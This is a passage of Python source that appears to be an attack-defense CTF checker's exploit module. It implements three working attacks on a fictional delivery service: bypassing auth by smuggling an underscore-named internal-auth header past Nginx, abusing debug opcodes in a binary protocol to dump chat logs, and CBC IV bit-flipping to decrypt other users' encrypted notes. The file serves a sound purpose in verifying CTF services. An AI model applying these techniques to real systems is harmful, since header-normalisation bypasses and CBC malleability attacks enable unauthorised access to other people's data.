    searcher: FlagSearcher,
    logger: LoggerAdapter,
) -> Optional[str]:
    """
    Vector A — Header Smuggling (Flag Store 0: special_instructions).
    Nginx strips X-Internal-Auth (hyphen) but passes X_Internal_Auth (underscore).
    Flask/Werkzeug normalises both, so the backend grants internal access.
    attack_info = order_id.
    """
    logger.debug(f"[exploit:header_smuggling] attack_info={attack_info!r}")

    if attack_info:
        try:
            oid = int(attack_info)
            logger.debug(
                f"[exploit:header_smuggling] Fast-path: GET /api/orders/{oid}/details "
                f"with X_Internal_Auth header"
            )
            resp = await client.get(
                f"/api/orders/{oid}/details",
                headers={"X_Internal_Auth": INTERNAL_SECRET},
            )
            logger.debug(
                f"[exploit:header_smuggling] fast-path response {resp.status_code}: "
                f"{resp.text[:300]}"
            )
            if resp.status_code == 200:
                special = resp.json().get("order", {}).get("special_instructions", "")
                found = searcher.search_flag(special.encode())
                if found:
                    logger.info(
                        f"[exploit:header_smuggling] Flag found via fast-path order_id={oid}"
                    )
                    return found
        except (ValueError, httpx.HTTPError) as e:
            logger.debug(f"[exploit:header_smuggling] fast-path error: {e}")

    logger.debug("[exploit:header_smuggling] Scanning /api/orders/recent fallback")
    try:
        resp = await client.get("/api/orders/recent")
    except httpx.TimeoutException:
        logger.warning("[exploit:header_smuggling] Timeout on /api/orders/recent")
        return None
    if resp.status_code != 200:
        logger.debug(
            f"[exploit:header_smuggling] /api/orders/recent returned {resp.status_code}"
        )
        return None
    orders = resp.json().get("orders", [])
    logger.debug(f"[exploit:header_smuggling] Scanning {len(orders)} recent orders")
    for order in orders:
        oid = order.get("id") or order.get("order_id")
        if not oid:
            continue
        try:
            resp2 = await client.get(
                f"/api/orders/{oid}/details",
                headers={"X_Internal_Auth": INTERNAL_SECRET},
            )
        except httpx.HTTPError:
            continue
        if resp2.status_code == 200:
            special = resp2.json().get("order", {}).get("special_instructions", "")
            found = searcher.search_flag(special.encode())
            if found:
                logger.info(
                    f"[exploit:header_smuggling] Flag found via scan order_id={oid}"
                )
                return found
    logger.debug("[exploit:header_smuggling] No flag found")
    return None

async def _vector_debug_opcode(
    client: httpx.AsyncClient,
    attack_info: Optional[str],
    searcher: FlagSearcher,
    logger: LoggerAdapter,
) -> Optional[str]:
    """
    Vector B — Debug Opcode Abuse (Flag Store 1: LiveTrack chat).
    BATCH frame (0x06): SET_DEBUG(0x31) enables debug mode, then
    DEBUG_ATTACH(0x30) grants access, then CHAT_HISTORY(0x05) dumps messages.
    attack_info = delivery_id.
    """
    logger.debug(f"[exploit:debug_opcode] attack_info={attack_info!r}")

    username, password = make_username(), random_str(12)
    logger.debug(f"[exploit:debug_opcode] Registering attacker {username!r}")
    try:
        reg = await register_user(client, username, password, "customer", logger)
    except (MumbleException, OfflineException) as e:
        logger.warning(f"[exploit:debug_opcode] Cannot register attacker: {e}")
        return None
    token = reg["token"]

    target_ids: list[int] = []
    if attack_info:
        try:
            target_ids.append(int(attack_info))
        except ValueError:
            pass
    target_ids += list(range(1, 101))

    auth_frame = _make_frame(0x01, f"{username}:{password}")
    seen: set[int] = set()

    for did in target_ids:
        if did in seen:
            continue
        seen.add(did)

        sub1 = bytes.fromhex(_make_frame(0x31, b""))
        sub2 = bytes.fromhex(_make_frame(0x30, str(did).encode()))
        sub3 = bytes.fromhex(_make_frame(0x05, str(did).encode()))
        batch_frame = _make_frame(0x06, sub1 + sub2 + sub3)

        logger.debug(
            f"[exploit:debug_opcode] Trying delivery_id={did} "
            f"via BATCH(SET_DEBUG+DEBUG_ATTACH+CHAT_HISTORY)"
        )
        try:
            results = await livetrack_raw(
                client, token, [auth_frame, batch_frame], logger
            )
        except (OfflineException, MumbleException) as e:
            logger.debug(f"[exploit:debug_opcode] livetrack_raw error did={did}: {e}")
            continue

        if len(results) < 2:
            continue
        auth_status, _ = results[0]
        if auth_status != 0x00:
            logger.debug(
                f"[exploit:debug_opcode] AUTH frame failed status=0x{auth_status:02x}"
            )
            continue
        batch_status, batch_data = results[1]
        logger.debug(
            f"[exploit:debug_opcode] BATCH response did={did} "
            f"status=0x{batch_status:02x} data_len={len(batch_data)}"
        )
        if batch_status == 0x00 and batch_data:
            found = searcher.search_flag(batch_data)
            if found:
                logger.info(
                    f"[exploit:debug_opcode] Flag found in delivery_id={did}"
                )
                return found

    logger.debug("[exploit:debug_opcode] No flag found")
    return None

async def _vector_cbc_bitflip(
    client: httpx.AsyncClient,
    attack_info: Optional[str],
    searcher: FlagSearcher,
    logger: LoggerAdapter,
) -> Optional[str]:
    """
    Vector C — CBC Bit-Flip (Flag Store 2: encrypted notes).
    HMAC covers ciphertext only, not the IV.
    First plaintext block: 'owner=XXXXXXXXXX' (16 bytes, zero-padded UID).
    XOR the IV to swap victim owner ID -> our ID -> server decrypts and returns note.
    attack_info = order_id.
    """
    def xor_bytes(a: bytes, b: bytes) -> bytes:
        return bytes(x ^ y for x, y in zip(a, b))

    def pad_owner(uid: int) -> bytes:
        return f"owner={str(uid).zfill(10)}".encode()

    logger.debug(f"[exploit:cbc_bitflip] attack_info={attack_info!r}")

    att_user, att_pass = make_username(), random_str(12)
    logger.debug(f"[exploit:cbc_bitflip] Registering attacker {att_user!r}")
    try:
        att_data = await register_user(client, att_user, att_pass, "customer", logger)
    except (MumbleException, OfflineException) as e:
        logger.warning(f"[exploit:cbc_bitflip] Cannot register attacker: {e}")
        return None
    attacker_id = att_data["user_id"]
    att_token = att_data["token"]
    attacker_block0 = pad_owner(attacker_id)
    logger.debug(
        f"[exploit:cbc_bitflip] attacker_id={attacker_id!r} "
        f"attacker_block0={attacker_block0!r}"
    )

    target_oids: list[int] = []
    if attack_info:
        try:
            target_oids.append(int(attack_info))
        except ValueError:
            pass
    try:
        resp = await client.get("/api/orders/recent")
        if resp.status_code == 200:
            target_oids += [o["id"] for o in resp.json().get("orders", [])]
            logger.debug(
                f"[exploit:cbc_bitflip] Found {len(target_oids)} target order_ids"
            )
    except httpx.TimeoutException:
        logger.warning("[exploit:cbc_bitflip] Timeout fetching recent orders")

    for order_id in target_oids:
        victim_id = None
        logger.debug(
            f"[exploit:cbc_bitflip] Resolving victim for order_id={order_id!r} "
            f"via X_Internal_Auth"
        )
        try:
            resp_det = await client.get(
                f"/api/orders/{order_id}/details",
                headers={"X_Internal_Auth": INTERNAL_SECRET},
            )
            if resp_det.status_code == 200:
                order_data = resp_det.json().get("order", {})
                victim_id = order_data.get("customer_id") or order_data.get("user_id")
                logger.debug(
                    f"[exploit:cbc_bitflip] Resolved victim_id={victim_id!r} "
                    f"for order_id={order_id!r}"
                )
        except httpx.TimeoutException:
            logger.debug(
                f"[exploit:cbc_bitflip] Timeout resolving victim for order_id={order_id!r}"
            )

        logger.debug(
            f"[exploit:cbc_bitflip] GET /api/notes/export?order_id={order_id}"
        )
        try:
            resp = await client.get(
                f"/api/notes/export?order_id={order_id}",
                headers={"Authorization": f"Bearer {att_token}"},
            )
        except httpx.TimeoutException:
            logger.debug(
                f"[exploit:cbc_bitflip] Timeout exporting notes order_id={order_id!r}"
            )
            continue
        logger.debug(
            f"[exploit:cbc_bitflip] export response {resp.status_code}: {resp.text[:200]}"
        )
        if resp.status_code != 200:
            continue
        exports = resp.json().get("exports", [])
        if not exports:
            continue

        for exp in exports:
            blob_hex = exp.get("blob", "")
            if not blob_hex:
                continue
            try:
                blob = bytes.fromhex(blob_hex)
            except ValueError as e:
                logger.debug(f"[exploit:cbc_bitflip] Bad hex blob: {e}")
                continue
            if len(blob) < 16 + 16 + 32:
                logger.debug(
                    f"[exploit:cbc_bitflip] Blob too short: {len(blob)} bytes"
                )
                continue

            iv = blob[:16]
            ciphertext = blob[16:-32]
            hmac_sig = blob[-32:]
            logger.debug(
                f"[exploit:cbc_bitflip] Blob iv={iv.hex()} ct_len={len(ciphertext)} "
                f"order_id={order_id!r}"
            )

            candidates: list[int] = []
            if victim_id is not None:
                try:
                    v = int(victim_id)
                    if v != attacker_id:
                        candidates.append(v)
                except (ValueError, TypeError):
                    pass
            if not candidates:
                candidates = [i for i in range(1, 51) if i != attacker_id]

            for v_id in candidates:
                victim_block0 = pad_owner(v_id)
                new_iv = xor_bytes(xor_bytes(iv, victim_block0), attacker_block0)
                new_blob = (new_iv + ciphertext + hmac_sig).hex()
                logger.debug(
                    f"[exploit:cbc_bitflip] Trying victim_id={v_id} "
                    f"new_iv={new_iv.hex()}"
                )
                try:
                    resp2 = await client.post(
                        "/api/notes/import",
                        headers={
                            "Authorization": f"Bearer {att_token}",
                            "Content-Type": "application/json",
                        },
                        json={"blob": new_blob},
                    )
                except httpx.TimeoutException:
                    logger.debug(
                        f"[exploit:cbc_bitflip] Timeout importing blob "
                        f"victim_id={v_id}"
                    )
                    continue
                logger.debug(
                    f"[exploit:cbc_bitflip] import response {resp2.status_code}: "
                    f"{resp2.text[:200]}"
                )
                if resp2.status_code == 200:
                    note_text = resp2.json().get("note", "")
                    if note_text:
                        found = searcher.search_flag(note_text.encode())
                        if found:
                            logger.info(
                                f"[exploit:cbc_bitflip] Flag found! "
                                f"order_id={order_id!r} victim_id={v_id}"
                            )
                            return found

    logger.debug("[exploit:cbc_bitflip] No flag found")
    return None

@checker.exploit(0)
async def exploit0(
    task: ExploitCheckerTaskMessage,
    searcher: FlagSearcher,
    logger: LoggerAdapter,
) -> Optional[str]:
    """Header Smuggling exploit for Flag Store 0."""
    attack_info = getattr(task, "attack_info", None)
    logger.info(f"[exploit(0)] Starting attack_info={attack_info!r}")
    async with httpx.AsyncClient(
        base_url=f"http://{task.address}:{SERVICE_PORT}", timeout=12.0
    ) as client:
        found = await _vector_header_smuggling(client, attack_info, searcher, logger)
        if found:
            return found
    raise MumbleException("Flag not found")

@checker.exploit(1)
async def exploit1(
    task: ExploitCheckerTaskMessage,
    searcher: FlagSearcher,
    logger: LoggerAdapter,
) -> Optional[str]:
    """Debug Opcode Abuse exploit for Flag Store 1."""
    attack_info = getattr(task, "attack_info", None)
    logger.info(f"[exploit(1)] Starting attack_info={attack_info!r}")
    async with httpx.AsyncClient(
        base_url=f"http://{task.address}:{SERVICE_PORT}", timeout=12.0
    ) as client:
        found = await _vector_debug_opcode(client, attack_info, searcher, logger)
        if found:
            return found
    raise MumbleException("Flag not found")

@checker.exploit(2)
async def exploit2(
    task: ExploitCheckerTaskMessage,
    searcher: FlagSearcher,
    logger: LoggerAdapter,
) -> Optional[str]:
    """CBC Bit-Flip exploit for Flag Store 2."""
    attack_info = getattr(task, "attack_info", None)
    logger.info(f"[exploit(2)] Starting attack_info={attack_info!r}")
    async with httpx.AsyncClient(
        base_url=f"http://{task.address}:{SERVICE_PORT}", timeout=12.0
    ) as client:
        found = await _vector_cbc_bitflip(client, attack_info, searcher, logger)
        if found:
            return found
    raise MumbleException("Flag not found")

if __name__ == "__main__":
    checker.run()
